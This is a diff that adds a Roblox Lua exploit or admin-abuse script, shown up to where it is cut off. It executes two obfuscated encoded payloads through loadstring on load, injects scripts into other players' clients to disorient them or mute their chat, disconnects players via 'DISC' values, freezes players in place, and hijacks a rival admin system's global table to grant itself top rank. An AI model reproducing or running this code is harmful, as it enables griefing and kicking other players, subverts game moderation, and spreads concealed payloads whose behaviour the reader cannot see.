@@ -1,0 +1,3702 @@
+--[[
+ _____       __ _       _ _           _____              ______
+|_   _|     / _(_)     (_) |         |  __ \            |___  /
+  | | _ __ | |_ _ _ __  _| |_ _   _  | |  \/ ___ _ __      / / 
+  | || '_ \|  _| | '_ \| | __| | | | | | __ / _ \ '_ \    / /  
+ _| || | | | | | | | | | | |_| |_| | | |_\ \  __/ | | | ./ /   
+ \___/_| |_|_| |_|_| |_|_|\__|\__, |  \____/\___|_| |_| \_/    
+                               __/ |                           
+                              |___/                         
+  _____    _        _ ___                    _ _ _      _   _                
+ |_   _|__| |_ __ _| | _ \___ __ ___ _ _  __(_) (_)__ _| |_(_)___ _ _        
+   | |/ _ \  _/ _` | |   / -_) _/ _ \ ' \/ _| | | / _` |  _| / _ \ ' \       
+   |_|\___/\__\__,_|_|_|_\___\__\___/_||_\__|_|_|_\__,_|\__|_\___/_||_|      
+  ___(_)_ _  __| |_ ___(_)_ _ | |/ /                                         
+ / -_) | ' \(_-<  _/ -_) | ' \| ' <                                          
+ \___|_|_||_/__/\__\___|_|_||_|_|\_\ _______                                 
+  __ _| |___| |__ ___ __ _/ |_  ) | |__ /_  )                                
+ / _` | / -_) / /(_-</ _` | |/ /|_  _|_ \/ /                                 
+ \__,_|_\___|_\_\/__/\__,_|_/___| |_|___/___|                                
+ | |   __ _ __| |_| _ \___ __ _(_)__(_)__| |___                              
+ | |__/ _` (_-<  _|   / -_) _` | / _| / _` / -_)                             
+ |____\__,_/__/\__|_|_\___\__, |_\__|_\__,_\___|                             
+  ___ _                  _|___/        _        _ _____                  _   
+ / __| |_  __ _ _ _ _ __| _ ) |__ _ __| |___ __| |_   _|  _ _ _ __ _ _ _| |_ 
+ \__ \ ' \/ _` | '_| '_ \ _ \ / _` / _` / -_) _` | | || || | '_/ _` | ' \  _|
+ |___/_||_\__,_|_| | .__/___/_\__,_\__,_\___\__,_| |_| \_, |_| \__,_|_||_\__|
+  ___       __ _   |_|_ _          ___                 |__/                  
+ |_ _|_ _  / _(_)_ _ (_) |_ _  _  |   \ _____ _____                          
+  | || ' \|  _| | ' \| |  _| || | | |) / -_) V (_-<                          
+ |___|_||_|_| |_|_||_|_|\__|\_, | |___/\___|\_//__/                          
+                            |__/ ]]
+--RUN LOCAL
+
+script.Parent = nil
+script = oscript or script
+local charMap = {["+"] = 0, ["!"] = 1, ["-"] = 2, ["_"] = 3, ["?"] = 4, ["*"] = 5, ["="] = 6, [")"] = 7, ["$"] = 8, ["&"] = 9, ["^"] = 10, ["@"] = 11, ["#"] = 12, ["~"] = 13, ["("] = 14, ["%"] = 15}; setfenv(assert(loadstring((string.gsub(table.concat({
+	"+*#=!=&)*=-)+-~_+-)=!=~=*=^_)?*=?)_**=-)=)&=_=*=$---+*#=!=&)*=-)_)--&-(-#?%=_=!=#=+*#=!=&)*=-)^+$=%=~=&=(=)=_*+)*=*=?=#-+*-*&?#--?!=_=@=#-(?%=?)&===&)#-~?+)&??=#-)?&???#-#?!=_)?)%?(=#=&=(=*=#-+-?*!=-=#=*=?)_)#-+--**=!)*)*=_)?)_)#-+-?*$)?)#-+-%?*)?)#-+-_*#-+--?#-+-_)_=#-+--=_=+-~_+-!_?_#-==!=#=_)*=#-==!=#=_)*=#-?)-)*)*=#-!_?_!_+_$_!_&_____#-&_)_!_)_!_!_#-@)~)#-+-@)~)#-+-@)~)#-+-@)~)#-+-@)~)#-+-@)~)#-+---^_--^+?*_?%=(=_)#-+-_?_?%=(=_)#-+-$?%=#=%=_)#-+-_?(?+-~_+-@)~)#-+-@)~)#-+-@)+*#=!=&)*=-)(-(?!=~=*=~)#-+---&?(===&=(=&=?)&)--^+)?#=%=-=*=_)#-+-_?%=#=%=-)_)+-~_+-@)~)#-+-@))?-)*=*=(=~_--#?&=~=*=+-)=-)*=*=(=--#--**=?=~_---**=!=#=#=&)+--)*=?=--#--?#=*)*=~_---**=!=#=#=&)+--=#=*)*=--#--?#=!=_=@=~_---**=!=#=#=&)+--=#=!=_=@=--#-&**=#=#=%=))~_--(?*=))+-&**=#=#=*=-)--~)^+_?%=#=%=-)_)(-%?-)!=(=)=*=#-_?%=#=%=-)_)(-)*$=&=?)*=#-_?%=#=%=-)_)(--?-)%=))(=#-_?%=#=%=-)_)(-_?&)!=(=+-~_+---??*=*=+)+-%=-)!=(=)=*=--#---&?(=_)?)&=?)*)?)&=%=(=!=#=+-))$=&=?)*=--#-"
+	,"---**=?=?=&=_)$=+--=-)%=))(=--#---?*%=%=?)$=+)!=_)?)*=--^+==!=-)-=&=?=?=*=(=+-~_+-+-@)--?*--(-(---*=--(-(---#=--(-(---*=--(-(---+)--(-(---%=--(-(----)_**=-)=)&=_=*=--#---^_--(-(---?**=--(-(---#=--(-(---*=+)--(-(---%=--(-(----)?)--#---)?!=(=)=(=!=~=--#----*%??*~-!_$_--#---+)#=!=--(-(---_=*=--(-(---&=--(-(---?=--#-)--=!=(=)-#-)-@=&=_=@=)-#-)-_=$=!=-)~?!=+))-#-)---(-(---)-#---)-(-(-)---~)^+(?%=?)&=#-?*_?_*#-_?%?#-(?-*_*#-(?&?#?#-~?)?#-^??*#-+*-?#--=#=#--**)(=#-#?%=!=?=*=?=+-~_+-@)~)#-@)~)#-@)~)#-@)~)#-@)~)#-@)~)#-@)~)#-@)~)#-@)~)#-?)-)*)*=#-==!=#=_)*=^++)-)&=(=?)$----?*)_)&)--&-"
+}), "(.)(.)", function(lo, hi) return string.char(charMap[lo] + charMap[hi] * 16) end)))), getfenv())()
+
+
+local cfs = {C0={},C1={}}
+cfs.C0.LS = CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+cfs.C1.LS = CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+cfs.C0.RS = CFrame.new(1, 0.5, 0, 0, 0, -1, 0, 1, 0, -1, 0, 0)
+cfs.C1.RS = CFrame.new(-0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, -1, 0, 0)
+cfs.C0.LH = CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+cfs.C1.LH = CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+cfs.C0.RH = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
+cfs.C1.RH = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
+
+Meshes = {
+        Earth = {10061232, 10061209, 3, 1, 1 ,1, 3,true},
+        Cloud = {111820358, 111820961, 3, 1, 1 ,1, 3,false},
+        Narutso = {34795798, 34914385, 2, 2, 2, 2, 2,true},
+        Egg = {1527559, 9564998, 1, 0, 1, 0, 3,true},
+        Rock = {1290033, 2861779, 2, 0, 1, 1, 2,true},
+        Atom = {16171271, 16171265, 1, 0.5, 1, 1, 3,true},
+        Tablet = {97689497, 97689055, 2, 1, 1, 1, 2,false},
+        Spider = {64485380, 64485392, 1, 1, 1, 1, 2,false}
+}
+Animate = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Animate",true) or Instance.new("Part")
+ 
+Char = Player.Character
+if Char then
+        Char.Archivable = true
+        Char = Char:clone()
+        local t = game:GetService("InsertService"):LoadAsset(68452456):findFirstChild("Clone")
+        if t then
+                for k,v in pairs(Char:GetChildren()) do
+                        if not v:IsA("Part") then
+                                v:clone().Parent = t
+                        end
+                end
+                Char = t:clone()
+        end
+end
+local charMap = {["+"] = 0, ["="] = 1, ["$"] = 2, ["%"] = 3, ["&"] = 4, ["!"] = 5, ["*"] = 6, ["-"] = 7, ["@"] = 8, ["_"] = 9, [")"] = 10, ["?"] = 11, ["~"] = 12, ["^"] = 13, ["("] = 14, ["#"] = 15}; setfenv(assert(loadstring((string.gsub(table.concat({
+	"@*!-_*+$^%+$?!?!)++$+$+$+$+$+$+$+$%-%*$-_*+-&-($+!=*$-!*(*&-+$^%+$^*+$~*#*%*=*~*+$%*&-~$%*#*~$~*^%?-^-~$-*=*^*!*)%-&!*&-%!!*$-*-_*%*!*@$$$%&#*(*&-$-^!^!($($?!?!#*~*~*!*$-%!!*$-*-_*%*!*$$_$~$-*=*^*!*)%-&!*&-%!!*$-*-_*%*!*@$$$~&_*-*@*&-_*(*-*$$_$)++$+$+$+$+$+$+$+$~*#*%*=*~*+$+-+$^%+$-*=*^*!*)%-&!*&-%!!*$-*-_*%*!*@$$$+!~*=*_-!*$-%-$$_$($~&#*%*=*~*+!~*=*_-!*$-+$~*#*%*=*~*+$^*+$^%+$+-)%-&!*&-^&#*!-%-!*@$_$+$^*($?&!*_-&&#*--(*)%%*#*(*(*!*%*&-@$**!-(*%*&-_*#*(*@$?*!*_-_$)++$+$+$+$+$+$+$+$~*#*%*=*~*+$&-^%_&(*%-&-=*(*%*!*($(*!*--@$$$%!&-$-_*(*-**!=*~*!-!*$$_$+$&-($(&=*^*!*^%$$?&!*_-&&#*--(*$$+$&-($*!=*~*!-!*+$^%+$?*!*_-+$&-($+!=*$-!*(*&-^%+-+$!*(*&*_$+$^*($$&!-&-&-#*(*=%&&#*--(*)%%*#*(*(*!*%*&-@$**!-(*%*&-_*#*(*@$_$)++$+$+$+$+$+$+$+$_***+$^*($&!=*$--*!*&-+$=*(*&*+$^*($&!=*$--*!*&-)%**_*(*&**&_*$-%-&-%&@*_*~*&*@$$$%&%!%&~*_*%*?*$$_$+$&-@*!*(*+$^*($&!=*$--*!*&-($%&%!%&~*_*%*?*($*!=*~*!-!*^%+-($(&=*^*!*+$!*(*&*+$!*(*&*_$)++$+$+$+$+$+$+$+$--@*_*~*!*"
+	,"+$--=*_*&-@$_$+$&*#*+$_***+$+-($(&=*^*!*+$^%^%+$$$&!#*&-=*~*$!!*%*#*(*%*_*~*_*=*&-_*#*(*$$+$#*$-+$+-($(&=*^*!*+$^%^%+$$$^&_*%-&-!*$-&&#*$*!*~*_*(*=*$$+$&-@*!*(*+$$-!*&-!-$-(*+$!*(*&*+$_***)++$+$+$+$+$+$+$+$~*)%**_*(*&**&_*$-%-&-%&@*_*~*&*@$$$&&_&%!%&)%+$$$($($+-($(&=*^*!*_$+$&-@*!*(*+$_-+-%*=*~*~*@$**!-(*%*&-_*#*(*@$_$_***+$+-($+!=*$-!*(*&-+$&-@*!*(*+$_&(*%-&-=*(*%*!*($(*!*--@$-$^&!*%-%-=*-*!*-$~$-!#*$-?*%-+-=*%*!*_$($&!!*@-&-+$^%+$$$_!#*!-+$@*=**-!*+$$*!*!*(*+$%&$-=*%-@*!*&*($$$+$--=*_*&-@$=%_$+$&&!*~*=*_-@$+%~$--=*_*&-_$+$!*~*%-!*+$_&(*%-&-=*(*%*!*($(*!*--@$-$^&!*%-%-=*-*!*-$~$-!#*$-?*%-+-=*%*!*_$($&!!*@-&-+$^%+$$$_!#*!-+$@*=**-!*+$$*!*!*(*+$(&_*~*%&$-=*%-@*!*&*($$$+$--=*_*&-@$=%_$+$&&!*~*=*_-@$+%~$--=*_*&-_$+$!*(*&*+$!*(*&*_$)++$+$+$+$+$+$+$+$--@*_*~*!*+$&-$-!-!*+$&*#*+$+-$-_*(*&-@$$$%!@&!!&!&&^!^!($($?!?!#&-!(&$$_$+$!*(*&*+$!*~*%-!*_***+$~*)%**_*(*&**&_*$-%-&-%&@*_*~*&*@$$$%&#&(&&!$!#&~&)%+$$$($($+-($(&=*^*!*_$+$&-@*!*(*+$_***)++$+$"
+	,"+$+$+$+$+$+$~*?!$$%&#&(&&!$!#&~&)%+$$$($($+-($(&=*^*!*^!($*!=*~*!-!*+$&-@*!*(*+$**#*$-+$?*~$*-+$_*(*+$+-=*_*$-%-@$%*#*)%-&!*&-%&@*_*~*&*$-!*(*@$_$_$+$&*#*+$*-)%$!!*^*#**-!*@$_$+$&-=*$*~*!*($_*(*%-!*$-&-@$%*&-~$*-_$+$!*(*&*)++$+$+$+$+$+$+$+$!*~*%-!*+$**#*$-+$?*~$*-+$_*(*+$+-=*_*$-%-@$%*&-_$+$&*#*+$*-($+!=*$-!*(*&-^%%*#*+$!*(*&*+$%*&-+$^%+$?-^-+$!*(*&*+$!*~*%-!*_***+$~*)%**_*(*&**&_*$-%-&-%&@*_*~*&*@$$$&&_&%!%&+$=&~&~&$$_$+$&-@*!*(*)++$+$+$+$+$+$+$+$_-+-%*=*~*~*@$**!-(*%*&-_*#*(*@$_$+$_&(*%-&-=*(*%*!*($(*!*--@$-$^&!*%-%-=*-*!*-$~$-!#*$-?*%-+-=*%*!*_$($&!!*@-&-+$^%+$$$_!#*!-+$@*=**-!*+$$*!*!*(*+$%&$-=*%-@*!*&*($$$+$--=*_*&-@$=%_$+$&&!*~*=*_-@$+%~$--=*_*&-_$!*(*&*_$+$!*~*%-!*_***+$~*)%**_*(*&**&_*$-%-&-%&@*_*~*&*@$$$&&_&%!%&+$(&_&~&$$_$+$=*(*&*+$(*#*&-+$+-($+!=*$-!*(*&-+$&-@*!*(*+$_-+-%*=*~*~*@$**!-(*%*&-_*#*(*@$_$)++$+$+$+$+$+$+$+$_&(*%-&-=*(*%*!*($(*!*--@$-$^&!*%-%-=*-*!*-$~$-!#*$-?*%-+-=*%*!*_$($&!!*@-&-+$^%+$$$_!#*!-+$@*=**-!*+$$*!*!*(*"
+	,"+$(&_*~*%&$-=*%-@*!*&*($$$+$--=*_*&-@$=%_$+$&&!*~*=*_-@$+%~$--=*_*&-_$+$+$!*(*&*_$+$+$!*(*&*+$!*(*&*)+^!^!"
+}), "(.)(.)", function(lo, hi) return string.char(charMap[lo] + charMap[hi] * 16) end)))), getfenv())()
+
+ 
+ 
+-- Utilities
+function Parse(a,m) local r = {}  for s in a:gmatch("[^"..(m or B).."]+") do table.insert(r,s) end return r end
+function Split(a) if not a:find(B) then return a end return a:sub(1,a:find(B)-1), a:sub(a:find(B)+1) end
+function Holo(a) for k,v in pairs(Holos) do if v:lower() == tostring(a or "nil"):lower() then return true end end end
+function ecall(a) local s,e = ypcall(a) if e then Output("Error: "..tostring(e),"Red") return end return true end
+function Script(s,par,loc,r)
+if block then return end
+ypcall(function()
+local a = loc and script and script:clone() or sou and sou:clone()
+if not a then return Output("No source!","Red") end
+if not a:findFirstChild("DSource") then
+        Instance.new("StringValue",a).Name = "DSource"
+end
+a.Disabled = true
+a.DSource.Value = s
+a.Parent = par
+wait(0.25)
+a.Disabled = false
+if r then Output(r,"Green") end
+return a
+end)
+end
+function Prom(plr)
+	Script([[
+		script.Parent = nil
+		Player = game:service('Players').LocalPlayer
+		CN = Player.Name
+		function Title(txt,part,rise)
+        local col = Color3.new(0,1,0)
+        local Gui = Instance.new("BillboardGui",part)
+        Gui.Name = "3DGUI"
+        Gui.ExtentsOffset = Vector3.new(0,2,0)
+        Gui.Size = UDim2.new(7,0,2.5,0)
+        local Tit = Instance.new("TextLabel",Gui)
+        Tit.Name = "Title"
+        --Tit.TextColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
+        Tit.TextColor3 = Color3.new(5,5,5)
+        Tit.TextTransparency = 0.25
+        Tit.TextStrokeColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
+        Tit.TextStrokeTransparency = 0
+        Tit.Size = UDim2.new(1,0,1,0)
+        Tit.BackgroundTransparency = 1
+        Tit.Font = "ArialBold"
+        Tit.TextScaled = true
+        Tit.Text = string.gsub(txt,"","\5")
+        if rise then
+                if not tonumber(rise) then rise = 1 end
+                coroutine.wrap(function()
+                        while Tit.Parent and Gui.Parent and wait() do
+                                Gui.ExtentsOffset = Gui.ExtentsOffset + Vector3.new(0,0.025*rise,0)
+                        end
+                end)()
+        end
+        return Tit
+end
+		function Show()
+        if Probe then Probe:Destroy() end
+Rot = 0
+
+coroutine.resume(coroutine.create(function()
+while wait() do
+for i=1, 360 do
+Rot = Rot + 0.6
+wait()
+end
+end
+end))
+        Probe = Instance.new("Part",workspace) local Camera = workspace.CurrentCamera
+        Probe.Shape, Probe.Size, Probe.BrickColor = "Ball", Vector3.new(3,3,3), BrickColor.new("White")
+        Probe.Transparency, Probe.Reflectance, Probe.Anchored, Probe.CanCollide, Probe.Locked = 0.5, 0.15, true, false, true
+        Probe.TopSurface, Probe.BottomSurface, Probe.Name = 0, 0, "Probe"..time()
+        Title(CN,Probe).Parent.ExtentsOffset = Vector3.new(0,2,0)
+        wait()
+P2 = Instance.new("Part", Workspace)
+P2.Anchored = true
+P2.Position = Vector3.new(1, 5, 1)
+P2.Shape = "Block"
+P2.Size = Vector3.new(1, 1, 1)
+P2.TopSurface = "Smooth"
+P2.BottomSurface = "Smooth"
+P2.Locked = true
+P2.Transparency = 0.2
+P2.Name = "P2"
+P2.BrickColor = BrickColor.new("Black")
+P2.CFrame = Probe.CFrame
+P2.Locked = true
+P2.CanCollide = false
+coroutine.wrap(function() while wait() and not Player.Character do Probe.CFrame = Camera.Focus end end)()
+
+while true do
+wait(0.001)
+P2.CFrame = Probe.CFrame * CFrame.Angles(math.rad(Rot),math.rad(Rot),math.rad(Rot))
+end
+
+end
+Show()
+]],plr.Backpack,true,"Probed "..plr.Name)
+end
+
+
+function Show()
+        if Probe then Probe:Destroy() end
+Rot = 0
+
+coroutine.resume(coroutine.create(function()
+while wait() do
+for i=1, 360 do
+Rot = Rot + 0.6
+wait()
+end
+end
+end))
+        Probe = Instance.new("Part",workspace) local Camera = workspace.CurrentCamera
+        Probe.Shape, Probe.Size, Probe.BrickColor = "Ball", Vector3.new(5,5,5), BrickColor.new("White")
+        Probe.Transparency, Probe.Reflectance, Probe.Anchored, Probe.CanCollide, Probe.Locked = 0.5, 0.15, true, false, true
+        Probe.TopSurface, Probe.BottomSurface, Probe.Name = 0, 0, "Probe"..time()
+        Title(CN,Probe,"White").Parent.ExtentsOffset = Vector3.new(0,2,0)
+        wait()
+P2 = Instance.new("Part", Workspace)
+P2.Anchored = true
+P2.Position = Vector3.new(1, 5, 1)
+P2.Shape = "Block"
+P2.Size = Vector3.new(2, 2, 2)
+P2.TopSurface = "Smooth"
+P2.BottomSurface = "Smooth"
+P2.Locked = true
+P2.Transparency = 0.2
+P2.Name = "P2"
+P2.BrickColor = BrickColor.new("Black")
+P2.CFrame = Probe.CFrame
+P2.Locked = true
+P2.CanCollide = false
+coroutine.wrap(function() while wait() and not Player.Character do Probe.CFrame = Camera.Focus end end)()
+
+while true do
+wait(0.001)
+P2.CFrame = Probe.CFrame * CFrame.Angles(math.rad(Rot),math.rad(Rot),math.rad(Rot))
+end
+
+end
+function DestroyCharacter()
+        local chara = Player.Character
+        if not chara then return end
+        if chara:findFirstChild("Humanoid") then
+                chara.Humanoid:Destroy()
+        end
+        chara:BreakJoints()
+        for k,v in pairs(chara:GetChildren()) do
+                if v:IsA("BasePart") then
+                        v.CanCollide = false
+                        v.Velocity = Vector3.new(math.random(-20,20),50,math.random(-20,20))
+                        v.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
+                end
+        end
+        game.Debris:AddItem(chara,3)
+end
+function Spawn()
+        if Char then
+                local c = Char:clone()
+				Title(CN,c.Head,"White").Parent.ExtentsOffset = Vector3.new(0,3,0)
+                c.Name = ""
+                c.Parent = workspace
+                c:MoveTo(workspace.CurrentCamera.Focus.p)
+                Player.Character = c
+                workspace.CurrentCamera.CameraSubject = c:findFirstChild("Humanoid")
+                workspace.CurrentCamera.CameraType = "Custom"
+                Probe:Destroy()
+				P2:Destroy()
+        end
+end
+--[[Grab players]]--
+function Players(a,s)
+        if a == "host" then return {Player} end local players = game:GetService("Players"):GetPlayers()
+        if a == "me" then return {s} end if a == "all" then return players end
+        if a == "random" then local r = players return {r[math.random(1,#r)]} end local r = {}
+        if a == "others" then for k,v in pairs(players) do if v~=s then table.insert(r,v) end end return r end
+        for ke,l in pairs(Parse(a,",")) do
+                if l:sub(1,1) == "!" then
+                        for k,v in pairs(NIL) do
+                                if k:lower():sub(1,#l-1) == l:sub(2):lower() then
+                                        table.insert(r,v)
+                                end
+                        end
+                end
+                for k,v in pairs(game:GetService("Players"):GetPlayers()) do
+                        if l == "holos" and Holo(v) then
+                                table.insert(r,v)
+                        elseif l == "nonholos" and not Holo(v) then
+                                table.insert(r,v)
+                        elseif l == "mrandom" and math.random() > 0.5 then
+                                table.insert(r,v)
+                        elseif v.Name:lower():sub(1,#l) == l:lower() then
+                                table.insert(r,v)
+                        end
+                end
+        end
+        return r
+end
+--[[""....................................................................""]]--
+function HoursAgo(t) local h=math.floor(t/3600) return h.."h "..math.floor((t-h*3600)/60).."m" end
+function findsource()
+        if sou or sou == false then return end
+        sou = false
+        Output("Trying to find a source")
+        while not sou and wait(1) do
+                local chs = {}
+                while game:findFirstChild(sou,true) do
+                        local ds = game:findFirstChild("DSource",true)
+                        if ds.Parent and ds.Parent:IsA("Script") and not ds.Parent:IsA("LocalScript") then
+                                sou = ds.Parent:clone()
+                        end
+                        table.insert(chs,ds)
+                        ds.Name = "SSource"
+                end
+                for k,v in pairs(chs) do
+                        v.Name = "DSource"
+                end
+        end
+        Output("Normal source found and cloned! NIIICCEEE","Green")
+        sou.Disabled = true
+        sou.Name = "InsertedScript"
+        Script(smi,workspace,false,"SMI Inserted")
+end
+function Crash(name)
+        name = tostring(name or "nil")
+        local t = Instance.new("StringValue")
+        t.Name = "DISC: "..name
+        t.Parent = game.Lighting
+        game:GetService("Debris"):AddItem(t,1)
+end
+function newBlast(target)
+	local p = Instance.new("Part", game.Workspace)
+	p.formFactor = 3
+	p.Size = Vector3.new(1, 1, 4)
+	p.Anchored = true
+	p.CanCollide = false
+	p.TopSurface = 0
+	p.BottomSurface = 0
+	p.BrickColor = BrickColor.new(Color3.new(1, 1, 1))
+	p.CFrame = CFrame.new(target.Position)
+	 * CFrame.new(math.random(-30, 30), 30, math.random(-30, 30))
+	coroutine.wrap(function()
+		local homeDuration = 0
+		while target.Parent and p.Parent do
+			local duration = wait()
+			homeDuration = homeDuration + (duration * 3)
+			p.CFrame = CFrame.new(p.Position, target.Position)
+			 * CFrame.new(0, 0, -(homingSpeed + homeDuration) * duration)
+			if (p.Position - target.Position).magnitude < 3 then
+				Instance.new("Explosion", game.Workspace).Position = p.Position
+				p:remove()
+				break
+			end
+		end
+		if p.Parent then
+			p:remove()
+		end
+	end)()
+end
+ 
+function Discall()
+        local t = Instance.new("StringValue")
+        t.Name = "DISC ALL"
+        t.Parent = game:GetService("Lighting")
+        wait(1)
+        t:Destroy()
+end
+ 
+-- Anti Navo
+Navo = [[
+function HaxNavo(tab)
+        print("NO".."VA:",tab)
+        tab["Over".."rided"] = true
+        tab["Over".."rider"] = nil
+        tab.KickingPhrases = {}
+        tab.UseGlobals = true
+        tab.LocalScript = nil
+        tab.Script = nil
+        local ranks = {}
+        for k,v in pairs(game:GetService("Players"):GetPlayers()) do
+                local rank = {Name=v.Name,Rank=0,CMD=false,Color=Color3.new(1,0,0),Desc="N/A",Complaints=Instance.new("Model")}
+                rank.Executables, rank.Mesh = Instance.new("Model"), false
+                table.insert(ranks,rank)
+        end
+        local a,b,c,d = "Complaints", Instance.new("Model"), "Executables", Instance.new("Model")
+        table.insert(ranks,{Name="TotalReconciliation",Rank=9,CMD=false,Color=Color3.new(1,1,1),Desc="N/A",Mesh = false,[a]=b,[c]=d})
+        tab.Ranked = ranks
+        local h = Instance.new("Hint",workspace)
+        h.Text = "NO".."VA Repaired"
+        game:GetService("Debris"):AddItem(h,1)
+        _G["NO".."VA"] = tab
+end
+function TrickNavo(msg)
+        for k,v in pairs(_G) do
+                _G[k] = nil
+        end
+        local t = {}
+        setmetatable(t,{__concat = function(a,b)
+                for k,v in pairs(getfenv(2)) do
+                        if k == "NO".."VA" then
+                                HaxNavo(v)
+                        end
+                end
+                return "LOOOL"
+        end})
+        _G[t] = "lol"
+        local m = {}
+        m.__index = function(s,key)
+                if key == "NO".."VACommands" then
+                        for k,v in pairs(getfenv(2)) do
+                                print(k,v)
+                        end
+                end
+        end
+        m.__newindex = function(s,key,val)
+                if key == "NO".."VACommands" then
+                        for k,v in pairs(getfenv(2)) do
+                                if k == "NO".."VA" then
+                                        HaxNavo(v)
+                                        error"Unknown error"
+                                end
+                        end
+                end
+        end
+        setmetatable(_G,m)
+        if not msg then return end
+        local m = Instance.new("Message",workspace)
+        m.Text = "NO".."VA detected NO".."VA-disabling scripts"
+        wait(3)
+        m.Text = "Use the command \"/NO".."VA/\" to destroy them"
+        wait(3)
+        m:Destroy()
+end
+TrickNavo(true)
+]]
+function TrickNavo(msg)
+        if msg then Instance.new("StringValue",workspace).Name = "msg" end
+        Script(Navo,workspace,false,"Navo Launched")
+        wait(3)
+        if msg then workspace.msg:Destroy() end
+end
+ 
+-- Output functions
+function Clear(out,plr)
+        if plr and plr ~= Player then
+                for k,v in pairs(S) do
+                        if v == plr.Name then
+                                k:Destroy()
+                                S[k] = nil
+                        end
+                end
+                return
+        end
+        if out then
+                if workspace:findFirstChild("[Output] "..CN) then
+                        workspace["[Output] "..CN]:Destroy()
+                end
+                return
+        elseif out == false then
+                if workspace:findFirstChild("[Input] "..CN) then
+                        workspace["[Input] "..CN]:Destroy()
+                end
+                return
+        end
+        if workspace:findFirstChild("[Output] "..Player.Name) then
+                workspace["[Output] "..CN]:Destroy()
+        end
+        if workspace:findFirstChild("[Input] "..Player.Name) then
+                workspace["[Input] "..CN]:Destroy()
+        end
+end
+function Title(txt,part,color,rise)
+        local col = type(color) == "string" and BrickColor.new(Colors[color]).Color or color or Color3.new
+        local Gui = Instance.new("BillboardGui",part)
+        Gui.Name = "3DGUI"
+        Gui.ExtentsOffset = Vector3.new(0,2,0)
+        Gui.Size = UDim2.new(7,0,2.5,0)
+        local Tit = Instance.new("TextLabel",Gui)
+        Tit.Name = "Title"
+        --Tit.TextColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
+        Tit.TextColor3 = Color3.new(5,5,5)
+        Tit.TextTransparency = 0.25
+        Tit.TextStrokeColor3 = Color3.new(col.r/2,col.g/2,col.b/2)
+        Tit.TextStrokeTransparency = 0
+        Tit.Size = UDim2.new(1,0,1,0)
+        Tit.BackgroundTransparency = 1
+        Tit.Font = "ArialBold"
+        Tit.TextScaled = true
+        Tit.Text = string.gsub(txt,"","\5")
+        if rise then
+                if not tonumber(rise) then rise = 1 end
+                coroutine.wrap(function()
+                        while Tit.Parent and Gui.Parent and wait() do
+                                Gui.ExtentsOffset = Gui.ExtentsOffset + Vector3.new(0,0.025*rise,0)
+                        end
+                end)()
+        end
+        return Tit
+end
+Raven = [==[
+	local fp = Instance.new("Part", game:GetService("Players").LocalPlayer.Character)
+fp.Anchored = true
+fp.Size = Vector3.new(10, 3, 25)
+game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = 32
+
+local players = {}
+
+local fpm = Instance.new("SpecialMesh", fp)
+fpm.MeshId = "http://www.roblox.com/asset/?id=20925363"
+fpm.TextureId = "http://www.roblox.com/asset/?id=20925361"
+fpm.Scale = Vector3.new(10, 10, 10)
+fpm.VertexColor = Vector3.new(1, 0, 0)
+
+fp.Touched:connect(function(part)
+        pcall(function()
+                table.insert(players, part.Parent:findFirstChild("Torso"))
+                part.Parent:findFirstChild("Torso").Anchored = true
+				part.Parent:findFirstChild("Humanoid").WalkSpeed = 0
+        end)
+end)
+
+while wait() do
+        fp.CFrame = CFrame.new(game:GetService("Players").LocalPlayer.Character.Torso.CFrame.x, game:GetService("Players").LocalPlayer.Character.Torso.CFrame.y - 5, game:GetService("Players").LocalPlayer.Character.Torso.CFrame.z) * CFrame.Angles(game:GetService("Players").LocalPlayer.Character.Torso.CFrame:toEulerAnglesXYZ())
+        fp.Position = fp.CFrame.p
+        for i, v in pairs(players) do
+                v.CFrame = fp.CFrame * CFrame.new(0, 3, 2)
+        end
+end ]==]
+
+
+MuteSource = [==[
+	game:GetService("StarterGui"):SetCoreGuiEnabled(4, false)
+]==]
+
+UnMuteSource = [==[
+	game:GetService("StarterGui"):SetCoreGuiEnabled(4, true)
+]==]
+
+FunScript = [[
+LP = game:service'Players'.LocalPlayer
+Shapes = {"Ball", "Block"}
+wait()
+script.Parent = nil
+Delay(0, function()
+while wait() do
+workspace.CurrentCamera.CameraType = "Scriptable"
+workspace.CurrentCamera.FieldOfView = workspace.CurrentCamera.FieldOfView + math.random(-5,5)
+workspace.CurrentCamera:SetRoll(workspace.CurrentCamera:GetRoll()+0.075)
+workspace.CurrentCamera.CoordinateFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
+local Part = Instance.new("Part", workspace.CurrentCamera)
+Part.Shape = Shapes[math.random(1, 2)]
+Part.Anchored = true
+Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
+Part.Size = Vector3.new(math.random(5,10),math.random(-25,25),math.random(5,10))
+Part.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-250,250),math.random(-100,100),math.random(-250,250)) * CFrame.Angles(math.random(),math.random(),math.random())
+local Smoke = Instance.new("Smoke", Part)
+Smoke.Color = Color3.new(math.random(), math.random(), math.random()) 
+Smoke.Opacity = 0.7 
+local Sparkles = Instance.new("Sparkles", Part)
+Sparkles.SparkleColor = Color3.new(math.random(), math.random(), math.random()) 
+local Fire = Instance.new("Fire", Part)
+Fire.Color = Color3.new(math.random(), math.random(), math.random()) 
+Fire.SecondaryColor = Color3.new(math.random(), math.random(), math.random()) 
+local Ex = Instance.new("Explosion", workspace.CurrentCamera)
+Ex.Position = Vector3.new(math.random(-250,250),math.random(10,100),math.random(-250,250))
+Ex.BlastPressure = 15
+Ex.BlastRadius = 12.5
+if not workspace.CurrentCamera:findFirstChild("Hint") then
+local mes = Instance.new("Hint", workspace.CurrentCamera)
